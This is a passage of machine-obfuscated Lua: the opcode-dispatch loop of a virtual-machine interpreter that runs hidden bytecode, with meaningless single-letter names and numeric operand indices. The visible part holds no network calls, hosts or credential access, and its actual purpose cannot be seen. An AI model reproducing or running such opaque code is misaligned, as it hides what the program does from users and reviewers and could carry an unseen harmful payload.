z<=59 then if 53>=z then if 50>=z then if 48>=z then local ba;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))elseif 49<z then local ba;local bb;w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]={r({},1,y[312])};n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];bb=y[870];ba=w[bb];for bc=bb+1,y[312]do t(ba,w[bc])end;else local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif z<=51 then local ba,bb=0 while true do if ba<=14 then if ba<=6 then if ba<=2 then if ba<=0 then bb=nil else if 1==ba then w[y[870]]=w[y[312]][y[716]];else n=n+1;end end else if ba<=4 then if ba>3 then w[y[870]]=w[y[312]][y[716]];else y=f[n];end else if 6~=ba then n=n+1;else y=f[n];end end end else if ba<=10 then if ba<=8 then if ba>7 then n=n+1;else w[y[870]]=w[y[312]][y[716]];end else if ba==9 then y=f[n];else w[y[870]]=w[y[312]]*y[716];end end else if ba<=12 then if ba<12 then n=n+1;else y=f[n];end else if 14~=ba then w[y[870]]=w[y[312]]+w[y[716]];else n=n+1;end end end end else if ba<=22 then if ba<=18 then if ba<=16 then if 16>ba then y=f[n];else w[y[870]]=j[y[312]];end else if ba==17 then n=n+1;else y=f[n];end end else if ba<=20 then if ba<20 then w[y[870]]=w[y[312]][y[716]];else n=n+1;end else if ba>21 then w[y[870]]=w[y[312]];else y=f[n];end end end else if ba<=26 then if ba<=24 then if ba==23 then n=n+1;else y=f[n];end else if ba~=26 then w[y[870]]=w[y[312]]+w[y[716]];else n=n+1;end end else if ba<=28 then if ba<28 then y=f[n];else bb=y[870]end else if 29<ba then break else w[bb]=w[bb](r(w,bb+1,y[312]))end end end end end ba=ba+1 end elseif z>52 then h[y[312]]=w[y[870]];else local ba;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif 56>=z then if z<=54 then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))elseif z==55 then local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];bc=y[312];bb=y[716];ba=k(w,g,bc,bb);w[y[870]]=ba;else local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif z<=57 then local ba=y[870];local bb=w[ba];for bc=ba+1,y[312]do t(bb,w[bc])end;elseif 59~=z then w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if(w[y[870]]~=w[y[716]])then n=n+1;else n=y[312];end;else w[y[870]]=false;end;elseif 65>=z then if z<=62 then if z<=60 then local ba;w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba]()elseif 61==z then if w[y[870]]then n=n+1;else n=y[312];end;else w[y[870]]=w[y[312]]-y[716];end;elseif 63>=z then local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end elseif 65~=z then local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end else local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif 68>=z then if 66>=z then w[y[870]]=(w[y[312]]-w[y[716]]);elseif z<68 then local ba;w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))else w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];n=y[312];end;elseif 69>=z then if(w[y[870]]<w[y[716]])then n=n+1;else n=y[312];end;elseif 70==z then local ba=y[870]local bb={w[ba](r(w,ba+1,y[312]))};local bc=0;for bd=ba,y[716]do bc=bc+1;w[bd]=bb[bc];end;else local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=false;n=n+1;y=f[n];ba=y[870]w[ba](w[ba+1])end;elseif 83>=z then if 77>=z then if 74>=z then if 72>=z then local ba=y[870];do return w[ba](r(w,ba+1,y[312]))end;elseif z~=74 then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))else local ba;w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif z<=75 then local ba,bb=0 while true do if(ba==7 or ba<7)then if(ba==3 or ba<3)then if(ba<1 or ba==1)then if not(ba~=0)then bb=nil else w[y[870]]=h[y[312]];end else if 3>ba then n=n+1;else y=f[n];end end else if ba<=5 then if(ba<5)then w[y[870]]=w[y[312]][y[716]];else n=n+1;end else if 6==ba then y=f[n];else w[y[870]]=y[312];end end end else if(ba==11 or ba<11)then if(ba<=9)then if not(ba~=8)then n=n+1;else y=f[n];end else if not(10~=ba)then w[y[870]]=y[312];else n=n+1;end end else if(ba<=13)then if not(13==ba)then y=f[n];else bb=y[870]end else if not(ba==15)then w[bb]=w[bb](r(w,bb+1,y[312]))else break end end end end ba=ba+1 end elseif z<77 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))else local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=true;n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif z<=80 then if z<=78 then local ba;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))elseif z~=80 then local ba;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))else w[y[870]]=false;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];if(w[y[870]]~=y[716])then n=n+1;else n=y[312];end;end;elseif 81>=z then w[y[870]]=true;elseif 82==z then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]]*y[716];n=n+1;y=f[n];w[y[870]]=w[y[312]]+w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]]+w[y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))else local ba=y[870];w[ba]=w[ba]-w[ba+2];n=y[312];end;elseif z<=89 then if(z==86 or z<86)then if(84>=z)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba>0 then bc=nil else bb=nil end else if ba<=2 then bd=nil else if ba<4 then w[y[870]]=j[y[312]];else n=n+1;end end end else if ba<=6 then if 6>ba then y=f[n];else w[y[870]]=w[y[312]][y[716]];end else if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[870]]=w[y[312]][y[716]];end end end end else if ba<=14 then if ba<=11 then if 10==ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[870]]=w[y[312]][y[716]];else if ba==13 then n=n+1;else y=f[n];end end end else if ba<=16 then if 16~=ba then bd=y[870]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba==18 then for be=bd,y[716]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif(z<86)then do return end;else local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba~=1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 4~=ba then w[y[870]]=j[y[312]];else n=n+1;end end end else if ba<=6 then if 5==ba then y=f[n];else w[y[870]]=w[y[312]][y[716]];end else if ba<=7 then n=n+1;else if ba~=9 then y=f[n];else w[y[870]]=w[y[312]][y[716]];end end end end else if ba<=14 then if ba<=11 then if 10==ba then n=n+1;else y=f[n];end else if ba<=12 then w[y[870]]=w[y[312]][y[716]];else if 14>ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba==15 then bd=y[870]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if ba>18 then break else for be=bd,y[716]do bb=bb+1;w[be]=bc[bb];end end end end end end ba=ba+1 end end;elseif(87>z or 87==z)then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if ba~=1 then bb=nil else bc=nil end else if ba<=2 then bd=nil else if 4>ba then w[y[870]]=h[y[312]];else n=n+1;end end end else if ba<=6 then if 6>ba then y=f[n];else w[y[870]]=h[y[312]];end else if ba<=7 then n=n+1;else if ba<9 then y=f[n];else w[y[870]]=w[y[312]][y[716]];end end end end else if ba<=14 then if ba<=11 then if 10<ba then y=f[n];else n=n+1;end else if ba<=12 then w[y[870]]=w[y[312]][w[y[716]]];else if 13==ba then n=n+1;else y=f[n];end end end else if ba<=16 then if ba<16 then bd=y[870]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 19~=ba then for be=bd,y[716]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif(88==z)then local ba=y[870]w[ba]=w[ba]()else if(not(w[y[870]]==y[716]))then n=(n+1);else n=y[312];end;end;elseif z<=92 then if z<=90 then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=false;n=n+1;y=f[n];ba=y[870]w[ba](w[ba+1])elseif 91<z then w[y[870]]=true;else local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](w[ba+1])end;elseif 93>=z then local ba;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))elseif z==94 then local ba;w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]][y[312]]=y[716];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))else local ba=y[870];local bb=w[y[312]];w[ba+1]=bb;w[ba]=bb[y[716]];end;elseif 143>=z then if z<=119 then if 107>=z then if 101>=z then if 98>=z then if z<=96 then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](w[ba+1])elseif z<98 then local ba;w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba]()else local ba;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][w[y[312]]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][w[y[312]]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][w[y[312]]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][w[y[312]]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][w[y[312]]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][w[y[312]]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][w[y[312]]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][w[y[312]]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][w[y[312]]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][w[y[312]]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](w[ba+1])end;elseif 99>=z then local ba=y[870]local bb={w[ba](r(w,ba+1,p))};local bc=0;for bd=ba,y[716]do bc=bc+1;w[bd]=bb[bc];end elseif z<101 then local ba;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](w[ba+1])else local ba;w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif 104>=z then if(102>=z)then local ba,bb=0 while true do if ba<=8 then if ba<=3 then if ba<=1 then if ba~=1 then bb=nil else w[y[870]]=w[y[312]][y[716]];end else if ba~=3 then n=n+1;else y=f[n];end end else if ba<=5 then if 5>ba then w[y[870]]=h[y[312]];else n=n+1;end else if ba<=6 then y=f[n];else if ba==7 then w[y[870]]=w[y[312]][y[716]];else n=n+1;end end end end else if ba<=13 then if ba<=10 then if ba==9 then y=f[n];else w[y[870]]=y[312];end else if ba<=11 then n=n+1;else if ba~=13 then y=f[n];else w[y[870]]=y[312];end end end else if ba<=15 then if ba==14 then n=n+1;else y=f[n];end else if ba<=16 then bb=y[870]else if ba==17 then w[bb]=w[bb](r(w,bb+1,y[312]))else break end end end end end ba=ba+1 end elseif(z<104)then w[y[870]]=(w[y[312]]%w[y[716]]);else local ba,bb=0 while true do if ba<=10 then if ba<=4 then if ba<=1 then if 1>ba then bb=nil else w[y[870]]=j[y[312]];end else if ba<=2 then n=n+1;else if 4~=ba then y=f[n];else w[y[870]]=w[y[312]][y[716]];end end end else if ba<=7 then if ba<=5 then n=n+1;else if ba<7 then y=f[n];else w[y[870]]=y[312];end end else if ba<=8 then n=n+1;else if ba~=10 then y=f[n];else w[y[870]]=y[312];end end end end else if ba<=15 then if ba<=12 then if ba~=12 then n=n+1;else y=f[n];end else if ba<=13 then w[y[870]]=y[312];else if 14<ba then y=f[n];else n=n+1;end end end else if ba<=18 then if ba<=16 then w[y[870]]=y[312];else if ba~=18 then n=n+1;else y=f[n];end end else if ba<=19 then bb=y[870]else if 20==ba then w[bb]=w[bb](r(w,bb+1,y[312]))else break end end end end end ba=ba+1 end end;elseif z<=105 then local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end elseif z==106 then local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end else local ba;local bb;local bc;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end end;elseif 113>=z then if 110>=z then if 108>=z then w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if(w[y[870]]~=w[y[716]])then n=n+1;else n=y[312];end;elseif 109<z then w[y[870]]=w[y[312]]%w[y[716]];else local ba;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif z<=111 then local ba;w={};for bb=0,u,1 do if bb<o then w[bb]=s[bb+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))elseif 112==z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];for ba=y[870],y[312],1 do w[ba]=nil;end;n=n+1;y=f[n];n=y[312];else local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif 116>=z then if z<=114 then for ba=y[870],y[312],1 do w[ba]=nil;end;elseif 116~=z then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]]*y[716];n=n+1;y=f[n];w[y[870]]=w[y[312]]+w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]]+w[y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))else local ba;local bb;local bc;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];bc=y[870]bb={w[bc](w[bc+1])};ba=0;for bd=bc,y[716]do ba=ba+1;w[bd]=bb[ba];end end;elseif z<=117 then local ba,bb,bc,bd=0 while true do if ba<=9 then if ba<=4 then if ba<=1 then if 1~=ba then bb=nil else bc=nil end else if ba<=2 then bd=nil else if ba~=4 then w[y[870]]=h[y[312]];else n=n+1;end end end else if ba<=6 then if 5<ba then w[y[870]]=h[y[312]];else y=f[n];end else if ba<=7 then n=n+1;else if 9>ba then y=f[n];else w[y[870]]=w[y[312]][y[716]];end end end end else if ba<=14 then if ba<=11 then if ba~=11 then n=n+1;else y=f[n];end else if ba<=12 then w[y[870]]=w[y[312]][w[y[716]]];else if ba~=14 then n=n+1;else y=f[n];end end end else if ba<=16 then if ba==15 then bd=y[870]else bc={w[bd](w[bd+1])};end else if ba<=17 then bb=0;else if 18==ba then for be=bd,y[716]do bb=bb+1;w[be]=bc[bb];end else break end end end end end ba=ba+1 end elseif z>118 then local ba;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=false;n=n+1;y=f[n];ba=y[870]w[ba](w[ba+1])else local ba;w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](r(w,ba+1,y[312]))end;elseif 131>=z then if 125>=z then if z<=122 then if z<=120 then if(y[870]<w[y[716]])then n=n+1;else n=y[312];end;elseif z~=122 then local ba;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];ba=y[870]w[ba]=w[ba](w[ba+1])else local ba=y[870];do return w[ba],w[ba+1]end end;elseif 123>=z then local ba=y[870];local bb=w[ba];for bc=ba+1,p do t(bb,w[bc])end;elseif 125>z then w={};for ba=0,u,1 do if ba<o then w[ba]=s[ba+1];else break;end;end;else local ba;local bb,bc;local 